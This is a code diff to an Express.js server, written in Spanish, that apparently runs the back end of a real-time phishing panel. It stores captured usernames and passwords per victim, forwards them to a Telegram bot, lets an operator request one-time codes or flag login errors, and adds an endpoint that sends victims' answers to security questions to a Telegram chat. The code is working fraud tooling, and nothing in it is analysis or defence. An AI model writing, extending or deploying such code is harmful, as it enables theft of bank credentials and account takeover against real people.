@@ -47,6 +47,14 @@ app.post('/enviar', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
+  clientes[txid] = {
+    status: "esperando",
+    usar,
+    clavv,
+    preguntas: []
+  };
+  guardarEstado();
+
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
@@ -55,14 +63,6 @@ app.post('/enviar', async (req, res) => {
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
-
-  clientes[txid] = {
-    status: "esperando",
-    usar,
-    clavv,
-    preguntas: []
-  };
-  guardarEstado();
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -78,8 +78,6 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-
-
 app.post('/callback', async (req, res) => {
   const callback = req.body.callback_query;
   if (!callback || !callback.data) return res.sendStatus(400);
@@ -91,6 +89,7 @@ app.post('/callback', async (req, res) => {
 
   if (!cliente) return res.sendStatus(404);
 
+  // Submenú de preguntas
   if (accion === 'preguntas_menu') {
     const preguntas = [
       "¿Cuál fue el nombre de mi primer novio(a)?",
@@ -130,6 +129,7 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
+  // Selección de preguntas
   if (accion === 'select_question') {
     const pregunta = decodeURIComponent(partes[2]);
 
@@ -155,6 +155,7 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
+  // Otras acciones
   cliente.status = accion;
   guardarEstado();
 
@@ -166,6 +167,41 @@ app.post('/callback', async (req, res) => {
       text: `Has seleccionado: ${accion}`
     })
   });
+
+  res.sendStatus(200);
+});
+
+// Envío de respuestas a las preguntas
+app.post('/enviar-preguntas', async (req, res) => {
+  const { txid, respuestas } = req.body;
+  const cliente = clientes[txid];
+
+  if (!cliente || !cliente.preguntas || cliente.preguntas.length !== 2) {
+    return res.status(400).send("Datos incompletos");
+  }
+
+  const mensaje = `
+🔐 PREGUNTAS RESPONDIDAS - ID: <code>${txid}</code>
+
+🟡 ${cliente.preguntas[0]}
+✏️ ${respuestas[0]}
+
+🟡 ${cliente.preguntas[1]}
+✏️ ${respuestas[1]}
+`;
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML'
+    })
+  });
+
+  cliente.status = "completo";
+  guardarEstado();
 
   res.sendStatus(200);
 });
